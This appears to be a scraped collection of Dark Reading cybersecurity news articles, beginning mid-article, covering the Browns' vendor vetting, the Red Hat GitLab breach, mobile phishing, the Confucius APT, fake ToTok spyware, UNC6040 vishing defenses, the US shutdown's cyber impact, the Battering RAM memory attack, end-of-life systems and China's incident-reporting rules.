privacy, sports-betting risks, or any other aspect of the game, the stadium, or employee security, the only way three people can conceivably secure a football team-sized attack surface is through decentralization.""We don't operate or run a lot of the technology that our fans and our users end up using,"" Covert admits. ""We're very much a company that outsources to third parties for ticketing, concessions, and sensitive biometrics."" The city of Cleveland also owns the stadium, so any non-football events held at the stadium are essentially outside the Browns organization.It's a gift and a curse. Three people would hardly be able to directly secure so many systems at once. Many of the vendors the team works with are small and lack robust cybersecurity standards.Covert knows that ""if something were to happen, even if it's not our systems, at the end of the day our name is going to be what's in the headline."" So this year he and his team have spent extra effort refining their vendor-vetting process.""Whether it's about fan data or otherwise, it really starts with a questionnaire. Do you have a cybersecurity role? Do you have a dedicated CISO? Do you have a disaster recovery plan documented? Do you do a yearly tabletop?"" he says. After gathering the necessary information, they determine a risk profile grade and discuss an acceptable level of risk with legal counsel and the business unit.""Depending on that risk analysis, sometimes [we'll put in] contractual obligations, like, 'Hey, you need to implement a CISO in 12 months as part of our ongoing agreement,' or 'You need to encrypt our data at rest — if you're not doing it now, within the next six months,'"" Covert says. ""That gets them to a level of viability that we feel comfortable with.""Covert also ensures that he can continuously monitor vendors' security, ""whether that's through audit rights, review rights, and we'll even do physical vulnerability scans of partner infrastructure that's housing our data or our fans' data.""Making sure that everyone within the organization is up to speed is the most significant part of the job, he says. That applies to vendors, employees, and even coaches on the field, who, if they open the wrong email, might just expose themselves to a Jax Ulbrich situation or expose the organization to much worse.""Coaches understand security from the perspective of 'protecting my game plan,' or 'my philosophy on how I view a defense, or an offense, or a third and long,'"" Covert says, so he trains them to see cybersecurity in the context of their existing priorities; likewise for the front office and scouts, when drafting players like Shedeur Sanders.""That's very sensitive information leading up to the draft. We teach our general manager and personnel team as they're going all around the country getting a lot of data,"" he says. ""That's ultimately going to be [key to] our strategy for player acquisition."""

UPDATERed Hat has confirmed a security incident that impacted its GitLab instance after a threat actor claimed to have breached tens of thousands of the Linux software-maker's private repositories.In an email sent to Dark Reading and other media outlets on Wednesday, an anonymous individual associated with a cybercrime group called ""Crimson Collective"" claimed that 28,000 of Red Hat's private repositories had been breached. The individual also claimed that, in addition to software code, these code-storage instances contained ""all their client's CER,"" which is apparently a reference to ""customer engagement reports.""A Red Hat spokesperson confirmed the incident and noted the attack ""is related to a GitLab instance used solely for Red Hat Consulting on consulting engagements, not GitHub"" as some initial reports claimed.""Red Hat is aware of reports regarding a security incident related to our consulting business and we have initiated necessary remediation steps,"" the spokesperson said. ""The security and integrity of our systems and the data entrusted to us are our highest priority.

While code repositories have long been a target for a variety of threat actors, several incidents in recent months have led to significant impacts on many organizations.For example, some of the widespread compromises of Salesforce customer environments this summer initially began with a compromised GitHub account of a third-party company. A threat group tracked as UNC6395 gained access to the GitHub account of Salesloft, a Salesforce partner, and used stolen OAuth tokens from company's Drift application to gain access to customers' Salesforce environments.GitLab has also been targeted by threat actors. In May 2024, threat actors exploited a critical vulnerability that allowed them to take over GitLab accounts. The vulnerability, tracked as CVE-2023-7028, received a maximum CVSS score of 10.Not long after, GitLab disclosed and patched two similar vulnerabilities, tracked as CVE-2024-5655 and CVE-2024-6385, that jeopardized customers CI/CD pipelines. While both flaws were critical, there were no reports of exploitation in the wild.It's unclear, meanwhile, how Crimson Collective gained access to Red Hat's GitLab instance, but GitLab was not affected by the attack, according to a company statement sent to Dark Reading.Related:Akira Hits SonicWall VPNs in Broad Ransomware Campaign""There has been no breach of GitLab’s managed systems or infrastructure.

2025-10-06 12:43:28,"October 2, 2025",Dark Reading,https://www.darkreading.com,https://www.darkreading.com/cyber-risk/phishing-moving-email-mobile-is-your-security,Phishing Is Moving From Email to Mobile. Is Your Security?,"With SMS, voice, and QR-code phishing incidents on the rise, it's time to take a closer look at securing the mobile user.
COMMENTARYEmail security has long dominated the enterprise security conversation — and rightfully so. It remains a key vector for phishing, credential theft, and social engineering. But in 2025, the threat landscape has shifted. Quietly yet decisively, attackers increasingly are bypassing the inbox and expanding their reach across multiple channels. Recent data from TechMagic shows that 41% of phishing incidents now employ multichannel tactics, including SMS (smishing), voice calls (vishing), and QR codes (quishing). The trend is clear: While email still matters, adversaries are shifting to mobile-first platforms like text, iMessage, WhatsApp, and social direct messages. These attacks are harder to spot, more difficult to control, and more likely to succeed, because they target the most vulnerable point in the chain: the human behind the screen.To address this growing threat to mobile platforms, new security approaches are emerging that leverage AI-driven defenses to identify and prevent social engineering attacks in real-time. By training large language models (LLMs) to understand the content and intent behind messages, these systems can flag suspicious activity and enforce protective measures before users fall victim. Whether it's a text message posing as IT support or impersonating a vendor, these next-generation solutions focus on stopping threats at the human layer — not just at the device.Related:Despite More CVEs, Cyber Insurers Aren't Altering PoliciesEnterprise chief information security officers (CISOs) regularly spend millions each year on email security. According to Fortune Business Insights, the global email security market is expected to grow from $5.17 billion in 2025 to $10.68 billion by 2032, with a compound annual growth rate (CAGR) of 10.9% during that period. However, when it comes to mobile channels — where human-targeted threats are on the rise — the investment is often minimal. This needs to change. The human threat doesn't go away outside the inbox; it intensifies on mobile devices, where users are more distracted, less cautious, and quicker to respond. What makes this shift even more critical is that the three fastest-growing human attack methods — smishing, vishing, and quishing — are all inherently mobile. Unlike email, they bypass existing enterprise defenses to reach users directly on their phones, where they are most vulnerable.Phishing as Smishing, Vishing, QuishingSmishing, also known as SMS phishing, is a type of phishing delivered via SMS or other mobile messaging applications. Instead of arriving via email, the malicious link often comes as a text — disguised as a trusted contact, delivery service, bank alert, or urgent security warning. Because SMS is native to mobile devices, the messages are not exposed to traditional email security tools — leaving desktop-based defenses blind to these attacks. Related:Shutdown Threatens US Intel Sharing, Cyber DefenseVishing, or voice phishing, is a relatively new technique that is surging in popularity due to its effectiveness. It utilizes live or prerecorded phone calls to deceive victims into disclosing credentials or transferring money, often in conjunction with mobile phishing. Attackers spoof caller IDs to appear as trusted entities — such as executives, IT help desks, banks, or government agencies — and target employees directly on their mobile phones, bypassing corporate desk phones. Quishing is a phishing attack that uses QR codes as bait. Instead of clicking a malicious link in an email, text, or message, the victim is tricked into scanning a QR code with their mobile device. That scan redirects them to a fake website designed to steal credentials, deliver malware, or capture sensitive data. It's especially risky because scanning QR codes feels routine and safe — menus, payments, tickets — and most security tools don't check them before the user's device connects.Related:Can Shadow AI Risks Be Stopped?Together, smishing, vishing, and quishing expose a blind spot that email security simply can't see. They exploit the channels people trust most on their phones — text, voice, and QR codes — slipping past traditional defenses and targeting the human directly. The Human Mobile LayerA key challenge is that most traditional defenses focus on technology rather than people, leaving a gap that attackers increasingly exploit. It's not about abandoning email protection, but, rather, adapting defenses to where attacks actually occur. Social engineering is becoming more sophisticated, contextual, and mobile, and security strategies must evolve accordingly.As the human layer becomes a primary target, mobile security must evolve beyond device posture and compliance checks to account for behavior, context, and the subtle cues that separate legitimate interactions from manipulation. The battle lines have shifted — attacks now target individuals across multiple channels, not just email — and cybersecurity strategies must adapt."

A long-running threat group operating in South Asia has shifted its cyber-espionage tactics from deploying infostealers to using more advanced Python backdoors against Microsoft Windows-based targets in Pakistan. The move demonstrates a significant ramp-up in its capabilities, researchers warn, and showcases how state-sponsored threat actors continue to advance in sophistication to meet evolving objectives and evade detection.Researchers from FortiGuard Labs uncovered this change in tactics from Confucius, a group that's been active since 2013 and is linked to India-sponsored cyber operations in the region, they revealed in a report published today.""Over the past decade, Confucius has repeatedly targeted government agencies, military organizations, defense contractors, and critical industries — especially in Pakistan — using spear-phishing and malicious documents as initial access vectors,"" Cara Lin, Fortinet's manager of antivirus analysis, wrote in the post. Indeed, in 2021, the group was seen targeting the Pakistani military with Pegasus spyware lures.However, lately the group has moved away from deploying stealers such as WooperStealer as their ultimate payloads and is eyeing a shift to long-term monitoring and persistence with the deployment of Python-based backdoors such as AnonDoor. It also is changing up its initial-access vectors and anti-detection techniques, respectively, by adopting diverse file types and then chaining OLE objects, malicious scripts, LNK files, PowerShell loaders, MSIL downloaders, and heavily obfuscated payloads to hide its activities.Related:Chinese APT Leans on Researcher PoCs to Spy on Other Countries""This progression underscores Confucius' adaptability and the growing sophistication of state-aligned malware campaigns in the region,"" as well as ""its ability to pivot rapidly between techniques, infrastructure, and malware families to maintain operational effectiveness,"" Lin wrote.Evolution of Indian APT Cyber Tactics, MalwareFortiGuard Labs' researchers tracked Confucius' evolution over several phishing campaigns targeting victims in Pakistan from last December to August of this year. Over the course of three different campaigns, the group went from using different obfuscation tactics to deploy the WooperStealer on compromised systems to deploying the Python-based stealer AnonDoor by August.The group changed the way it obscured and deployed the ultimate malware payload over that time period as well. The December attack that was observed, a phishing campaign, ""relied on authority spoofing, minimal context, and an action-oriented request to entice the recipient into opening the attachment and kick off the infection chain,"" according to Lin.Related:Charon Ransomware Emerges With APT-Style TacticsOnce that chain went into action, the actor used malicious DLL files and DLL sideloading to eventually execute its payload, the researchers found. However, by March 2025, when another Confucius campaigned targeted Pakistani victims with WooperStealer yet again, the group's malware deployment went beyond the use of DLL files to also using malicious LNK files in their campaigns.The August campaign showed further evolution not just in obfuscation tactics but in the ultimate payload delivery mechanism. While Confucius once again used malicious LNK files to deliver malware to victims in Pakistan, this time the Python-based AnonDoor backdoor was embedded via a temporary PowerShell script.Also of note: The version of the backdoor deployed in the August attack had a structure that ""closely mirrors"" an MSIL-based version of AnonDoor, according to researchers. The malware operates by consolidating collected system information into the parameter ""uhhg"" using ""$!!$"" as a delimiter between fields. ""The resulting data is transmitted to the command-and-control (C2) server, where access and retrieval appear to be restricted to specific geographic targets such as Pakistan,"" Lin wrote.Related:Koreans Hacked, Blackmailed by 250+ Fake Mobile AppsThe Slithering Advantage of Using PythonConfucius' latest moves are indicative of the evolving nature of threat groups who are constantly adapting their techniques to stay ahead of the security research community, which also is constantly developing new techniques to detect them, notes John Bambenek, president at security firm Bambenek Consulting. By changing tactics and using different ways to obscure their activity, these actors are hoping to stay one step ahead of defenders, he says.In particular, Confucius's use of Python-based tools and malware ""exploits the persistent difficulty in detecting malicious activity within scripting languages where you have a myriad of obfuscation techniques,"" Bambenek notes. Moreover, as Python is routinely used everywhere, it gives attackers an advantage in that they are free to leverage its capabilities ""without having to install new tools or binaries as well,"" he said.Confucius's change in direction also requires flexibility and evolution from defenders, and FortiGuard Labs included a list of indicators of compromise (IoCs) of the campaign so they can set up antivirus (AV) and other security solutions to detect potential compromise. ""As threat actors persistently refine their methods to bypass defenses,"" Lin noted, ""maintaining vigilance against varied attack techniques is critical."""
2025-10-06 12:44:53,"October 2, 2025",Dark Reading,https://www.darkreading.com,https://www.darkreading.com/cyberattacks-data-breaches/android-spyware-uae-spyware,Android Spyware in the UAE Masquerades as ... Spyware,"In a clever, messed-up twist on brand impersonation, attackers are passing off their spyware as a notorious UAE government surveillance app.
Hackers are spreading two families of mobile spyware around the United Arab Emirates (UAE) by masking them as the ToTok app.ToTok is a messaging and Voice over IP (VoIP) app developed by G42, an Abu Dhabi government project supported by Microsoft. It's marketed to Emirati citizens as privacy- and security-forward, like WhatsApp and Telegram, but it's spyware.Ironically, thanks to the peculiar history and cultural standing it enjoys in the UAE, this spyware app is proving to be good cover for copycat spyware. Researchers at ESET recently spotted two: ""ToSpy"" and ""ProSpy,"" the latter of which also mimics Signal. Little is known about the developers or victims of these programs, beyond the victims' country of origin, but what's clear is that the campaigns spreading ToSpy and ProSpy have been ongoing for years: the latter since 2024, the former since 2022.Spyware vs. SpywareToTok used to be very popular in the UAE, specifically. It was designed for and heavily marketed to Emiratis, it was local, and the Emirati government blocked certain core functions of popular Western messaging apps — like VoIP — engendering an artificial competitive advantage into which ToTok neatly fit.Ever since reporters unearthed the true nature of ToTok in December 2019, it has been barred from the Apple App Store and Google Play. That might have spelled the death of any other app, but ToTok can survive indefinitely through its unlimited backing. And while Apple devices are restrictive of apps outside of its ecosystem, the Android version of ToTok has continued to circulate outside of Google Play, via the company's website and other app stores from Samsung, Huawei, and additionalChinese vendors.Related:North Korean Group Targets South With Military ID DeepfakesThus the idea of downloading ToTok outside of Google Play is not just conceivable for users, it's prescribed by the developer. It's a golden opportunity for hackers, who can easily mimic ToTok or third-party app stores to funnel prospective users to their phishing sites.ToSpy and ProSpy are masked as ""Pro"" editions of ToTok on English-language phishing sites. When someone downloads either, they're presented with Google's inevitable security warning: that installing apps from unknown sources can make their device and personal data vulnerable to attack. The user is likely to be unbothered, though, since the real version of the app would trigger the very same warning.Both ToSpy and ProSpy will ask the user for a variety of invasive permissions. When the user inevitably agrees, the malware can begin exfiltrating their data to an attacker-controlled server. Among the data it targets: device information, contacts, SMS message histories, and a variety of file types including audio, video, archives, and documents.Related:Innovative FileFix Phishing Attack Proves Plenty PotentPayload vs. Play ProtectLukáš Štefanko, senior malware researcher at ESET, assesses that ""from a technical perspective, they are not very sophisticated [malware], however, from my experience sophistication is not always a key for a successful espionage campaign."" Bells and whistles like code obfuscation, encryption, running in memory, etc., may not be necessary on less protected devices, so ""in my opinion these campaigns worked because they were simple, and from a victim's perspective they seemed useful, because they looped victims from malicious app back to legitimate,"" he says.In that last point, Štefanko refers to the way in which the malware continues perpetuating the ruse in the foreground of the device, even as it's stealing data in the background. If a ToSpy or ProSpy victim already has the real ToTok app installed — or in cases where ProSpy mimics Signal — the malicious app will simply launch it. If not, the malware will redirect the user to where they can download it.ESET shared its findings with Google, and Google claims that Android users are protected against ToSpy and ProSpy by Google Play Protect, which is active by default on Android devices with Google Play.

With the specter of more Salesforce breaches looming, Google — no stranger to such attacks — is advising organizations to step up their defenses against UNC6040.In a blog post on Tuesday, Mandiant provided insights into the notorious threat campaign and offered proactive hardening measures to help enterprises protect not just their Salesforce instances but other cloud assets as well. In the post, Mandiant incident response personnel dove into UNC6040's ""repeated success"" in compromising Salesforce instances, including Google's, by use of telephone-based social engineering, or vishing, attacks.""This approach has proven particularly effective in tricking employees, often within English-speaking branches of multinational corporations, into actions that grant the attackers access or lead to the sharing of sensitive credentials, ultimately facilitating the theft of [the] organization's Salesforce data,"" the blog post stated. ""In all observed cases, attackers relied on manipulating end users, not exploiting any vulnerability inherent to Salesforce.""As previously documented by Google's Threat Intelligence Team (GTIG), the threat actors convince targeted employees to visit a modified, unauthorized version of the Salesforce Data Loader app, which gives UNC6040 the ability to access and exfiltrate sensitive data from customers' Salesforce environments. These compromises are followed by extortion demands, which sometime occur months after the initial intrusion — from actors claiming to be part of the ShinyHunters cybercriminal group, which has claimed responsibility for these attacks.Related:'Confucius' Cyberspy Evolves From Stealers to Backdoors in PakistanThe danger isn't only to Salesforce data, Mandiant warned. After compromising Salesforce instances, the threat actors harvest credentials for lateral movement through the victim's network and other cloud platforms, including Okta and Microsoft 365.Defending Against UNC6040 Social Engineering TacticsMuch of Mandiant's recommendations involve verifying identity, as cybercriminal groups such as Shiny Hunters and Scattered Spider have demonstrated an uncanny ability to socially engineer their targets. As such, Mandiant urged organizations not to inherently trust a caller's identity and to implement a combination of different verification methods.Therefore, organizations should avoid using publicly available or easily discoverable identifiers such as Social Security numbers, birth dates, and supervisor names. Instead, Mandiant recommended live video identity proofing, which it called ""the most reliable method"" for verifying callers.Related:'Klopatra' Trojan Makes Bank Transfers While You SleepAfter connecting on a video call, help desk agents should require the individual to present a valid corporate badge or government-issued photo ID next to their face. In addition to making a visual match between the individual and the ID, as well as confirming a name match, the help desk agent should cross-reference the individual's face with their photo contained in the internal corporate identity system.Mandiant also said that before initiating any request from the individual, help desk agents should check the caller's calendar status to make sure they're not out of the office or on vacation. For high-risk requests from individuals — like resetting multifactor authentication (MFA) settings — Mandiant recommended organizations go a step further and apply out-of-band (OOB) verification layers, such as calling the individual's registered phone number on file and contacting their manager for confirmation.ShinyHunters Hunting For Third-Party AccessMandiant highlighted two specific tactics that UNC6040 has used in the vishing calls. The first is impersonating support personnel from third-party vendors with requests for access to a target organization's resources. ""Under no circumstances should the help desk move forward with allowing access,"" Mandiant warned, adding that an organization's standard verification principals may not apply to these situations.Related:Chinese APT Leans on Researcher PoCs to Spy on Other CountriesInstead, help desk agents should hang up without providing any information to the caller, contact the designated account manager for the specific third-party, and require ""explicit verification"" from the account manager.Mandiant's incident response team has also observed UNC6040 hunting users with elevated access to SaaS applications in an organization. Typically, the threat actors pose as vendors or support personnel and trick the users into clicking a link that prompts a login for the specific application, which allows the attackers to harvest the credentials.Verification procedures for third-party requests should include ending the call and contacting the designated account manager, requiring the caller to submit a ticket with the official company support portal, and requiring the caller to present a valid ticket number that can be confirmed in the support system.""Organizations should also provide a clear and accessible process for end-users to report suspicious communications and ensure this reporting mechanism is included in all security awareness outreach,"" Mandiant wrote.It's unclear if UNC6040's tactics have shifted or changed in recent months as its attacks have been publicized. Dark Reading contacted Google for comment but the company did not respond at press time.Mandiant offered other hardening recommendations such as using a single sign-on (SSO) provider and deploying phishing-resistance MFA with FIDO 2 physical keys. The company also urged organizations to implement dynamic authentication policies and monitor for risky or suspicious user behavior that suggests an account has been compromised."

Any prolonged US federal government shutdown could have wide-ranging consequences for the nation's cybersecurity posture, with the biggest immediate concern being a disruption in cyber threat intelligence sharing between the private sector and government.Other major concerns include the US Cybersecurity and Infrastructure Security Agency's (CISA) continued ability to execute its mission and potential exposures at federal agencies forced to release contractors and third parties on whom they currently rely for cybersecurity.A Potential Setback for Cyber Threat Intel Sharing?The shutdown, which began on Oct. 1 at 12:01 a.m., coincided with the lapsing of the Cybersecurity Information Sharing Act of 2015 (CISA 2015), after Congress failed to reauthorize the bill before its Sept. 30, 2025, sunset date.CISA 2015 provided important legal protections for companies that shared threat data in good faith, shielding them from liability related to privacy or antitrust concerns. Security experts widely consider the statute vital for encouraging the voluntary exchange of cyber threat indicators such as malware signatures and attack patterns between the private sector and federal, state, and local governments.If the shutdown stalls or delays efforts to renew the law, the impact on intel sharing could be significant at a time US entities are under mounting threats from state-backed adversaries, cybercriminal gangs, and hacktivists.Related:Despite More CVEs, Cyber Insurers Aren't Altering Policies""The importance of the Cybersecurity Information Sharing Act of 2015 for US national security cannot be overstated,"" says Crystal Morin, cybersecurity strategist at Sysdig. ""Without legal protections, many legal departments would advise security teams to pull back from sharing threat intelligence, resulting in slower, more cautious processes.""Legal departments would likely advise their security teams to scale back or halt sharing altogether, given the loss of liability protections and Freedom of Information Act (FOIA) shields. That shift would reduce the flow of high-fidelity, threat insights and hamper the ability for organizations stop adversarial campaigns before they escalate, she says. ""Instead of real-time information sharing, a lapse would likely cause more cautious, delayed, and limited exchanges, weakening the momentum that CISA built over the last eight years.""Randolph Barr, chief information security officer (CISO) at Cequence Security, says CISA 2015 provided a mechanism for security professionals and defenders to collaborate more openly with each other against adversaries who freely share knowledge to amplify their attacks. ""That imbalance hasn't gone away, but CISA gave us a mechanism to close the gap, enabling defenders to collaborate in ways that were previously out of reach,"" Barr says. If CISA fails to renew, ""security teams would be forced to fall back on their independent feeds, siloed intelligence, and their own interpretations of potential attacks,"" he says. That would slow down detection, limit context, and reduce the collective resilience industry has built over the past decade, Barr adds.Related:Phishing Is Moving From Email to Mobile. Is Your Security?Mass Furloughs and Staff ImpactsThe lockdown could also lead to mass furloughs at CISA and impede the agency's ability to perform critical functions, like threat analysis, incident response and support for private sector partners, that many have come to rely on in recent years. Guidance that the US Department of Homeland Security (DHS) issued a few days before the shutdown indicated CISA would furlough 65% of its employees — or 1,651 people — in the event of a funding lapse.A reduction in workforce at CISA could temporarily limit proactive threat-hunting and slow incident response efforts, warns Ensar Seker, CISO at SOCRadar. It could also reduce the effectiveness of national-level coordination across government and private sectors. ""The net effect would be fewer eyes on the threat landscape at a time when adversaries constantly probe for weaknesses,"" Seker says.Related:Can Shadow AI Risks Be Stopped?In addition to CISA employees being furloughed, there's a good chance that all contractors working in cyber positions for federal agencies will be sent home as well, says Mike Hamilton, field CISO of Lumifi Cybersecurity. These are people that are critical to getting vulnerabilities patched and responding to incidents, he says.""When a vulnerability is announced and a patch released by a vendor for a product that is exposed to the Internet, both nation-states and criminal groups will scan federal exposures and identify vulnerable products and exploit them to compromise those agencies,"" Hamilton predicts. ""The lack of analysts monitoring events and a team to respond will likely result in these actors becoming embedded in the networks. At a minimum, this puts confidential communications and agency operations at risk.""An Increase in Shutdown-Themed Social EngineeringSome also expect an increase in phishing and other forms of social engineering tied to the government shutdown. Most of the activity is likely going to consist of stealing credentials and other sensitive data from vulnerable and likely anxious furloughed workers. ""We'll likely see an uptick in tactics related to HR/payroll/benefits, such as fake forms or identity verification requests, or early notice for return to work before the public announcement of the shutdown ending,"" predicts Brandon Potter, chief technology officer (CTO) at ProCircular. Email subjects such as ""Urgent payroll update,"" ""Furlough confirmation,"" or ""Action required to receive furlough benefits"" are going to be some likely lures, he says.The scams will be designed to harvest credentials and capture multifactor bypass tokens and likely use lookalike domains to increase credibility. Potter says, ""I wouldn't put it past threat actors to piggyback vishing alongside these phishing emails, making phone calls to increase the legitimacy of the email and the request.""Federal agencies, Potter advises, should review their incident response plan, and run a practice scenario, if possible, to gauge their readiness to respond to incidents while waiting for federal assistance. They need to establish and communicate the authorized channels for shutdown information, such as HR, payroll, and benefits, and remind employees on phishing red flags and general security awareness. ""Focus on identity,"" Potter says. ""Increase monitoring of identity threats and verify, for the 100th time, that all accounts have [multifactor authentication] enabled, especially those with privileged access to systems or networks."""

Security researchers have built a $50 device that can bypass the confidential computing defenses of both Intel and AMD processors used in hardware powering cloud environments, thus allowing attackers to break encryption designed to protect sensitive data.An attack called ""Battering RAM"" can break through both Intel SGX and AMD SEV-SNP processor defenses ""designed to protect sensitive workloads from compromised hosts, malicious cloud providers, or rogue employees,"" according to the researchers at KU Leuven and the University of Birmingham/Durham University who developed the attack.""Modern computers use memory modules (DRAM) to store everything in use: from photos and passwords to credit card numbers,"" according to the research team's website. ""Public cloud providers increasingly deploy hardware-level memory encryption to protect this sensitive data.""The researchers demonstrate how they can break this encryption by building a low-cost imposer that sits in the memory path of the processor-based memory encryption that cloud-based systems use to protect sensitive data. The imposer — which is invisible to the OS — can bypass both SGX-protected memory as well as break SEV's attestation feature on systems without other vulnerabilities present.Related:Critical Azure Entra ID Flaw Highlights Microsoft IAM IssuesThe researchers said that ""with a flip of a switch, our interposer turns malicious and silently redirects protected addresses to attacker-controlled locations, allowing corruption or replay of encrypted memory.""How Battering RAM Attacks WorkCommercial passive DRAM interposers, which are used to connect DRAM memory chips to a processor in advanced packaging systems, tend to cost more than $100,000. However, the researchers outlined how they developed a custom interposer using analog switches to manipulate signals between the processor and memory for less than $50.The printed circuit board (PCB) is a standard four-layer design and can be fabricated at any major PCB fabricator such as JLCPCB, PCBWay, or Eurocircuits, they said. Schematics and board files for the interposer are available open source via the researcher team's GitHub repository.Battering RAM is an evolution of a previous attack developed by the researchers called BadRAM that similarly exploited physical address aliasing to modify and replay encrypted memory on AMD SEV-SNP systems, according to the researchers. BadRAM accomplished this by introducing static ghost address lines.In response, Intel and AMD added boot-time checks to detect and block such static aliases, the researchers said. Battering RAM ups the ante by introducing memory aliases dynamically at runtime, which allows it to beat Intel's and AMD's mitigations for BadRAM.Related:The Cloud Edge Is the New Attack SurfaceOnce the system boots up, an attacker flips a switch and the imposer dynamically rewrites address metadata, pointing protected memory pages to attacker-controlled memory aliases that capture encrypted data. The imposer then reconfigures so the attacker location occupies the victim's physical address and then replays the captured ciphertext. This eventually forces decryption of the data, which then appears in the attacker location.For the attack to be successful, however, it requires that someone have one-time physical access to the hardware system, even if only for a short time. Thus, an attacker would have to be some kind of insider — such as a rogue employee, a data center technician or maintenance person, a member of law enforcement, or someone in the supply chain who could tamper with memory modules during shipping or manufacturing, the researchers acknowledged.Bypassing Processor Memory DefensesThe attack works slightly differently to bypass memory depending on the processor. The single-key domain of Intel Total Memory Encryption (TME) technology, which, used in Intel Scalable SGX, enables arbitrary plaintext access through the interposer-induced aliases, the researchers explained. Thus, bypassing memory encryption depends only on accessing the secret key and the physical address, they said.Related:Phishing Empire Runs Undetected on Google, Cloudflare""By capturing victim ciphertext and replaying the captured contents into its own enclaves, the attacker gains read access to the victim plaintext,"" the researchers explained. ""Similarly, the attacker can also write arbitrary plaintext into victim enclaves.""AMD's SEV-SNP ensures the integrity of launched virtual machines (VMs) by taking a measurement of the initial memory contents and matching the hash with the expected value provided by the customer.In the Battering RAM attack, the interposer can capture and replay launch measurements, thus compromising SEV's attestation. ""This allows an attacker to introduce arbitrary backdoors into the VM, without detection,"" the researchers said. The attack also uses dynamic memory aliases to bypass boot-time alias checks and thus the memory protection, they said.Response from Chip MakersBoth Intel and AMD have acknowledged the exploit, which the researchers reported to them in February. However, ""they noted that physical attacks on DRAM are out of scope for their current products,"" and thus won't be making any changes to their processor technology to mitigate a potential attack, the researchers said.Both companies also offered separate advisories about the attack on Tuesday that basically said as much. Intel's advisory also offered the advice that ""the cryptographic integrity protection mode of Intel Total Memory Encryption-Multi-Key (Intel TME-MK) can provide additional protection against alias-based attacks,"" which is available on 5th generation Intel Xeon processors and the Xeon 6 processor family with P-cores.""Relying parties should understand the physical protection properties of the platforms they are trusting,"" according to Intel. ""Platform owners can demonstrate which platforms they control (and thereby their physical protection), by identifying which platform certificates they hold during attestation.""AMD, meanwhile, also said it did not plan to release any mitigations ""because the reported exploit is outside the scope of the published threat model for SEV-SNP, as detailed in Table 1 of the AMD SEV-SNP technical paper,"" according to its advisory.Ultimately, the researchers said their exploit demonstrates how confidential computing is ""not invincible,"" and defenders should reevaluate threat models to better understand and prepare for physical attacks.""Encrypted memory is not inherently secure against physical tampering,"" the researchers said, ""and firmware-based mitigations alone are insufficient in threat scenarios involving limited physical access, such as malicious insiders or supply-chain compromises."""

It's a practical reality that enterprises have systems with older operating system versions running in their networks. A recent analysis by exposure management company runZero found that 8.56% of assets are running an end-of-life operating system, with 5% of all observed assets already beyond security support as of Sept. 30.It could be the server in a closet no one remembers about, so the operating system was never upgraded. Or perhaps an extremely business-critical application works only on an older operating system. ""My million-dollar MRI machine runs only on Windows 7,"" quips Tod Beardsley, vice-president of security research at runZero. The primary goal behind runZero's counting exercise was to understand the ""normal"" population of end-of-life systems within a given enterprise, Beardsley says. Internet scans can provide insight into the number of legacy systems and out-of-date applications that attackers can see from outside the organization, but this only gives part of the story. Attackers, once in a network, rely on their reconnaissance activities to uncover other systems that can be compromised. Organizations need to be aware that 5% of systems an attacker is likely to encounter during their probes could be vulnerable.  While it would be nice to be able to say there are no end-of-life systems in a given organization, it would be more realistic to have a baseline, and then have organizations assess whether they have more end-of-life systems than the ""norm,"" making them a bigger target. That doesn't mean that security teams can pat themselves on the back if less than 5% of assets in the enterprise is unpatchable, Beardsley notes.Related:Hacked Routers Linger on the Internet for Years, Data ShowsAn industry breakdown is helpful in assessing the attack surface and associated risks. With the baseline for extended end-of-life systems being 5%, four industries — retail, machinery and electronics manufacturing, professional/scientific/technical services, and wood/paper/chemicals manufacturing — fare worse than average. The wood/paper/chemicals manufacturing sector includes biotech and pharmaceutical companies, which account for the large number of end-of-life and extended end-of-life operating systems.Windows 10 End-of-Life Will Expand Attack Surface Windows 10 officially enters end-of-life on Oct. 14, meaning those systems will no longer receive any security updates. Considering that Windows 10 is still widely used — one-third of all Windows systems worldwide, according to runzero's Beardsley — that is a lot of machines that will no longer be actively supported. Related:Criminals Sending QR Codes in Phishing, Malware CampaignsThat baseline of the number of end-of-life systems in a given organization? ""That number will change Oct. 14, to almost triple,"" says Beardsley.End-of-life does not mean the systems will stop working — they will continue to function just as they did before. However, it's a fact that Windows 10 has vulnerabilities that have not yet been discovered or fixed. End-of-life means that when those vulnerabilities are eventually found (possibly because attackers have figured out a way to exploit them), the systems will be exposed because no patch or update will be available. There may be exceptions — Microsoft released an emergency exception update for Windows XP back in 2017, three years after the operating system's end-of-life, to fix the flaw being exploited by WannaCry — but security teams should not be counting on those types of emergency fixes.Microsoft has been talking about the Windows 10 end-of-life over the past two years, but the lack of panic surrounding the end of security patches for Windows 10 is ""both puzzling and troubling,"" Beardsley notes. It was only this past July that the number of Windows 11 systems exceeded the number of Windows 10 systems. ""EOL status does not mean instant crashes, breaches, and ransom demands,"" Beardsley notes. ""But, if I were in the business of international espionage and cyberwar, I would be sitting on my killer Windows 10 exploit until I could be reasonably sure it couldn’t be blocked by routine updates.""Related:Bridging the Secure Access Gap in Third-Party, Unmanaged Devices"

Infrastructure providers in China will have a scant 60 minutes to report security incidents involving the most critical networks starting Nov. 1, following new regulations issued by the Chinese government.The requirements, described in a notice published by the Cyberspace Administration of China, require network operators who build, operate, or provide services in China and its territories to report any security incidents to the appropriate ministry. The missive requires network operators to grade any incident and, if the security event impacted ""key infrastructure,"" report the incident within an hour. For ""a major or particularly important network security incident,"" the regulations require notification within 30 minutes.Other types of incidents give more leeway to the network operation, allowing them to report the incident within two to four hours, depending on the criticality of the networks.""If there are special regulations in this industry, network operators should also report in accordance with the requirements of the competent regulatory authorities in the industry,"" stated a translated version of the notice, entitled ""Measures for the Management of National Network Security Incident Reports."" ""If you are suspected of committing a crime, the network operator shall report the case to the public security [bureau] in time.""Related:Prep is Underway, But 2026 FIFA World Cup Poses Significant Cyber ChallengesChina's focus on hardening its own networks comes after its own widespread attacks on global networks. The Salt Typhoon threat group, linked to Chinese military intelligence, compromised systems at satellite-communications operator Viasat, according to information published in June. In August, the FBI notified 600 organizations in 80 countries that the Salt Typhoon group had taken interest, if not action, in their networks.Following those attacks, China is tightening its own cybersecurity, says Tom Kellermann, vice president of cyber risk at HiTrust, a cybersecurity risk management organization.""After their successful cyber-espionage campaigns against Western telcos, they appreciate the systemic risk to their national security,"" he says. ""This is compounded by increased cyber operations by the Quad alliance.""Increasing Pressure on China's OperatorsThe new reporting regulations turn up the heat on network operators in China. Networks operators that fail to report within the timelines will be punished, and those that conceal incidents or falsify details of incidents, will be ""punished more severely according to law,"" the notice stated.China's definition of a ""particularly major network security incident"" includes breaches of important data or a large amount of citizen data that could pose a danger to national security or social stability, or impacts to systems that could result in large-scale disruptions 